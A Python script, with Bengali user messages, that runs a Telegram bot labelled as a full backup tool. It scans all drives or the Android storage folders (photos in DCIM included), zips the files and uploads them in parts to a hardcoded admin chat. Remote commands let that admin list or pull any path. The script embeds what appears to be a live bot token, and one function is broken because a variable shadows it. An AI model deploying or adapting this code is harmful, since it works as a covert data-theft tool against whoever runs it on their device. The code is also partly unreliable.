import os
import platform
import zipfile
import logging
import string
import time
import requests
import threading
from datetime import datetime
from pathlib import Path

# ================= CONFIGURATION =================
ADMIN_ID = 8526073588
BOT_TOKEN = "8824366795:AAGmtDySsz-NKjOgbq1ZbdpknCRNROqJZ6w"  # সিঙ্গেল বট ব্যবহার করছি

# ================= Logging Setup =================
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

last_update_id = 0
processing_lock = threading.Lock()
is_processing = False

# ================= SKIP DIRECTORIES =================
SKIP_DIRS = {
    'proc', 'sys', 'dev', 'run', 'tmp', 'boot', 'var', 'etc', 'usr', 'bin', 'lib',
    'Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
    'Android', '.git', '.idea', '__pycache__', 'node_modules', 'venv', '.venv',
    'System Volume Information', '$Recycle.Bin', 'lost+found', 'cache', 'temp'
}

# ================= HELPER FUNCTIONS =================
def get_root_paths():
    """Get all root directories"""
    roots = []
    system_os = platform.system()

    if system_os == "Windows":
        drives = [f'{d}:\\' for d in string.ascii_uppercase if os.path.exists(f'{d}:\\')]
        roots.extend(drives)
    elif system_os in ["Linux", "Darwin"]:
        android_paths = ["/storage/emulated/0/", "/sdcard/", "/data/data/com.termux/files/home/"]
        for path in android_paths:
            if os.path.exists(path):
                roots.append(path)
        roots.append("/")
    
    if not roots:
        roots.append(os.getcwd())
    
    return list(set(roots))

def send_message(chat_id, text, parse_mode=None):
    """Send text message to Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    if parse_mode:
        data["parse_mode"] = parse_mode
    
    try:
        response = requests.post(url, json=data, timeout=30)
        return response.json()
    except Exception as e:
        logger.error(f"Send message error: {e}")
        return None

def send_document(chat_id, file_path, caption=""):
    """Send document to Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id, 'caption': caption[:1000]}
            response = requests.post(url, files=files, data=data, timeout=120)
            return response.json()
    except Exception as e:
        logger.error(f"Send document error: {e}")
        return None

def get_updates(offset=None):
    """Get updates from Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30, "allowed_updates": ["message"]}
    if offset:
        params["offset"] = offset
    
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except Exception as e:
        logger.error(f"Get updates error: {e}")
        return []

def zip_path(path, zip_path):
    """Zip a specific path (file or folder)"""
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            if os.path.isfile(path):
                zipf.write(path, os.path.basename(path))
                return True, 1
            elif os.path.isdir(path):
                file_count = 0
                for dirpath, dirnames, filenames in os.walk(path):
                    dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
                    for filename in filenames:
                        file_path = os.path.join(dirpath, filename)
                        arcname = os.path.relpath(file_path, os.path.dirname(path))
                        zipf.write(file_path, arcname)
                        file_count += 1
                return True, file_count
        return False, 0
    except Exception as e:
        logger.error(f"ZIP error for {path}: {e}")
        return False, 0

def send_large_zip_in_parts(chat_id, zip_path):
    """Split and send large ZIP files"""
    max_size = 49 * 1024 * 1024
    file_size = os.path.getsize(zip_path)
    
    if file_size <= max_size:
        return send_document(chat_id, zip_path, "📦 জিপ ফাইল")
    
    send_message(chat_id, f"⚠️ ফাইল বড় ({file_size // (1024*1024)}MB), {file_size // max_size + 1} ভাগে পাঠানো হচ্ছে...")
    
    part_num = 1
    with open(zip_path, 'rb') as f:
        while True:
            chunk = f.read(max_size)
            if not chunk:
                break
            part_path = f"{zip_path}.part{part_num}"
            with open(part_path, 'wb') as pf:
                pf.write(chunk)
            send_document(chat_id, part_path, f"📦 পার্ট {part_num}")
            os.remove(part_path)
            part_num += 1
            time.sleep(1)
    return True

def handle_b1(chat_id, path):
    """Zip and send a specific path"""
    if not os.path.exists(path):
        send_message(chat_id, f"❌ পাথটি বিদ্যমান নয়:\n{path}")
        return
    
    send_message(chat_id, f"🗜️ জিপ করছি:\n{path}")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_name = f"backup_{os.path.basename(path)}_{timestamp}.zip"
    zip_path = os.path.join(os.getcwd(), zip_name)
    
    success, count = zip_path(path, zip_path)
    if not success:
        send_message(chat_id, "❌ জিপ তৈরি করতে ব্যর্থ হয়েছে")
        return
    
    zip_size = os.path.getsize(zip_path) / (1024*1024)
    send_message(chat_id, f"✅ জিপ তৈরি হয়েছে:\n📦 ফাইল: {count}\n💾 সাইজ: {zip_size:.2f} MB\n📤 পাঠানো হচ্ছে...")
    
    send_large_zip_in_parts(chat_id, zip_path)
    os.remove(zip_path)
    send_message(chat_id, "✅ সম্পন্ন!")

def handle_b2(chat_id, file_path):
    """Send a specific file"""
    if not os.path.exists(file_path) or not os.path.isfile(file_path):
        send_message(chat_id, f"❌ ফাইলটি বিদ্যমান বা বৈধ নয়:\n{file_path}")
        return
    
    file_size = os.path.getsize(file_path) / (1024*1024)
    send_message(chat_id, f"📤 পাঠাচ্ছি:\n{file_path}\n💾 সাইজ: {file_size:.2f} MB")
    
    if file_size > 50:
        send_message(chat_id, "⚠️ ফাইল 50MB এর বড়, অংশে অংশে পাঠানো হচ্ছে...")
        send_large_file_in_parts(chat_id, file_path)
    else:
        send_document(chat_id, file_path, os.path.basename(file_path))
    
    send_message(chat_id, "✅ ফাইল পাঠানো সম্পন্ন!")

def send_large_file_in_parts(chat_id, file_path):
    """Send large file in 49MB chunks"""
    max_size = 49 * 1024 * 1024
    part_num = 1
    with open(file_path, 'rb') as f:
        while True:
            chunk = f.read(max_size)
            if not chunk:
                break
            part_path = f"{file_path}.part{part_num}"
            with open(part_path, 'wb') as pf:
                pf.write(chunk)
            send_document(chat_id, part_path, f"📦 পার্ট {part_num}")
            os.remove(part_path)
            part_num += 1
            time.sleep(1)

def handle_info(chat_id, path):
    """Show folder/file info of a path"""
    if not os.path.exists(path):
        send_message(chat_id, f"❌ পাথটি বিদ্যমান নয়:\n{path}")
        return
    
    if os.path.isfile(path):
        size = os.path.getsize(path) / (1024*1024)
        send_message(chat_id, f"📄 ফাইল:\nনাম: {os.path.basename(path)}\nসাইজ: {size:.2f} MB")
        return
    
    folders = []
    files = []
    try:
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isdir(item_path):
                folders.append(item)
            else:
                files.append(item)
    except PermissionError:
        send_message(chat_id, "⚠️ এই ফোল্ডার অ্যাক্সেস করার অনুমতি নেই")
        return
    
    # Limit display to avoid message too long
    fol_list = "\n".join(folders[:20]) + ("..." if len(folders) > 20 else "")
    fil_list = "\n".join(files[:20]) + ("..." if len(files) > 20 else "")
    
    msg = f"📁 পাথ: {path}\n📂 ফোল্ডার: {len(folders)}\n📄 ফাইল: {len(files)}\n\n"
    if folders:
        msg += f"📁 ফোল্ডারগুলো:\n{fol_list}\n\n"
    if files:
        msg += f"📄 ফাইলগুলো:\n{fil_list}"
    
    send_message(chat_id, msg[:4000])

# ================= COMMAND HANDLER =================
def handle_command(chat_id, command):
    """Handle user commands"""
    if chat_id != ADMIN_ID:
        send_message(chat_id, "⛔ অনুমতি নেই! শুধু অ্যাডমিন এই বট ব্যবহার করতে পারেন।")
        return
    
    if command.startswith("/b1 "):
        path = command[4:].strip()
        threading.Thread(target=handle_b1, args=(chat_id, path), daemon=True).start()
    
    elif command.startswith("/b2 "):
        path = command[4:].strip()
        threading.Thread(target=handle_b2, args=(chat_id, path), daemon=True).start()
    
    elif command.startswith("/info "):
        path = command[6:].strip()
        threading.Thread(target=handle_info, args=(chat_id, path), daemon=True).start()
    
    elif command == "/start":
        send_message(chat_id, 
                    "📦 **ফুল ব্যাকআপ বট**\n\n"
                    "🔧 **কমান্ডসমূহ:**\n"
                    "• `/backup` - সম্পূর্ণ ব্যাকআপ\n"
                    "• `/b1 /পাথ` - পাথের সবকিছু জিপ করে পাঠাবে\n"
                    "• `/b2 /ফাইলের_পাথ` - নির্দিষ্ট ফাইল পাঠাবে\n"
                    "• `/info /পাথ` - ফোল্ডার/ফাইলের তথ্য দেখাবে\n"
                    "• `/status` - ব্যাকআপ স্ট্যাটাস\n"
                    "• `/help` - হেল্প দেখাবে",
                    parse_mode="Markdown")
    
    elif command == "/backup":
        send_message(chat_id, "🚀 ব্যাকআপ প্রক্রিয়া শুরু হচ্ছে...")
        threading.Thread(target=create_and_send_backup, args=(chat_id,), daemon=True).start()
    
    elif command == "/status":
        with processing_lock:
            if is_processing:
                send_message(chat_id, "⏳ ব্যাকআপ প্রোসেসিং চলছে...")
            else:
                send_message(chat_id, "✅ কোন ব্যাকআপ প্রোসেসিং চলছে না।")
    
    elif command == "/help":
        send_message(chat_id,
                    "📖 **হেল্প গাইড**\n\n"
                    "`/b1 /storage/emulated/0/DCIM`\n→ ওই ফোল্ডার জিপ করে পাঠাবে\n\n"
                    "`/b2 /sdcard/file.txt`\n→ ফাইলটি পাঠাবে\n\n"
                    "`/info /storage/emulated/0`\n→ দেখাবে কয়টা ফোল্ডার/ফাইল আছে\n\n"
                    "`/backup` → সম্পূর্ণ ব্যাকআপ",
                    parse_mode="Markdown")
    else:
        send_message(chat_id, "❓ অজানা কমান্ড। `/help` দেখুন।")

# ================= BACKUP FUNCTIONS =================
def get_total_size(start_path):
    total_size = 0
    try:
        for dirpath, dirnames, filenames in os.walk(start_path):
            dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS and not d.startswith('.')]
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    if os.path.exists(file_path):
                        total_size += os.path.getsize(file_path)
                except:
                    continue
    except:
        pass
    return total_size

def zip_all_files(zip_path, root_paths, progress_callback=None):
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            total_files = 0
            total_processed = 0
            
            for root_path in root_paths:
                if not os.path.exists(root_path):
                    continue
                for dirpath, dirnames, filenames in os.walk(root_path):
                    dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS and not d.startswith('.')]
                    total_files += len(filenames)
            
            for root_path in root_paths:
                if not os.path.exists(root_path):
                    continue
                for dirpath, dirnames, filenames in os.walk(root_path):
                    dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS and not d.startswith('.')]
                    for filename in filenames:
                        file_path = os.path.join(dirpath, filename)
                        try:
                            arcname = os.path.relpath(file_path, root_path)
                            zipf.write(file_path, arcname)
                            total_processed += 1
                            if progress_callback and total_processed % 100 == 0:
                                progress_callback(total_processed, total_files)
                        except Exception as e:
                            logger.error(f"Cannot add {file_path}: {e}")
                            continue
            return True, total_processed
    except Exception as e:
        logger.error(f"ZIP creation error: {e}")
        return False, 0

def create_and_send_backup(chat_id):
    global is_processing
    with processing_lock:
        if is_processing:
            send_message(chat_id, "⏳ ইতিমধ্যে একটি ব্যাকআপ প্রোসেসিং চলছে!")
            return
        is_processing = True
    
    try:
        root_paths = get_root_paths()
        send_message(chat_id, f"🔍 স্ক্যান শুরু হচ্ছে...\n📂 লোকেশন: {', '.join(root_paths[:3])}{'...' if len(root_paths) > 3 else ''}")
        send_message(chat_id, "📊 ফাইলের সাইজ ক্যালকুলেট করা হচ্ছে...")
        
        total_size = 0
        for path in root_paths:
            total_size += get_total_size(path)
        
        size_gb = total_size / (1024**3)
        send_message(chat_id, f"💾 মোট সাইজ: {size_gb:.2f} GB\n🔄 জিপ তৈরি করা হচ্ছে...")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_filename = f"full_backup_{timestamp}.zip"
        zip_path = os.path.join(os.getcwd(), zip_filename)
        
        def update_progress(processed, total):
            if processed % 500 == 0:
                percent = (processed / total) * 100 if total > 0 else 0
                send_message(chat_id, f"📦 প্রগ্রেস: {processed}/{total} ফাইল ({percent:.1f}%)")
        
        success, file_count = zip_all_files(zip_path, root_paths, update_progress)
        if not success:
            send_message(chat_id, "❌ জিপ ফাইল তৈরি করতে ব্যর্থ হয়েছে!")
            return
        
        zip_size = os.path.getsize(zip_path) / (1024*1024)
        send_message(chat_id, f"✅ জিপ তৈরি সম্পন্ন!\n📦 ফাইল: {file_count}\n💾 সাইজ: {zip_size:.2f} MB\n📤 পাঠানো হচ্ছে...")
        
        send_large_zip_in_parts(chat_id, zip_path)
        os.remove(zip_path)
        send_message(chat_id, "✅ ব্যাকআপ সম্পন্ন!")
        
    except Exception as e:
        logger.error(f"Backup error: {e}")
        send_message(chat_id, f"❌ ত্রুটি: {str(e)[:200]}")
    finally:
        with processing_lock:
            is_processing = False

# ================= MAIN LOOP =================
def main():
    global last_update_id
    print("=" * 50)
    print("📦 FULL BACKUP BOT STARTED")
    print("=" * 50)
    print(f"👤 Admin ID: {ADMIN_ID}")
    print("✅ Bot is running!")
    print("Commands: /b1, /b2, /info, /backup, /status, /help")
    print("Press Ctrl+C to stop\n")
    
    while True:
        offset = last_update_id + 1 if last_update_id > 0 else None
        updates = get_updates(offset)
        for update in updates:
            update_id = update.get("update_id")
            if update_id:
                last_update_id = update_id
            if "message" in update:
                message = update["message"]
                chat_id = message["chat"]["id"]
                if "text" in message:
                    handle_command(chat_id, message["text"].strip())
        time.sleep(1)

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        import subprocess
        subprocess.check_call(['pip', 'install', 'requests'])
        import requests
    main()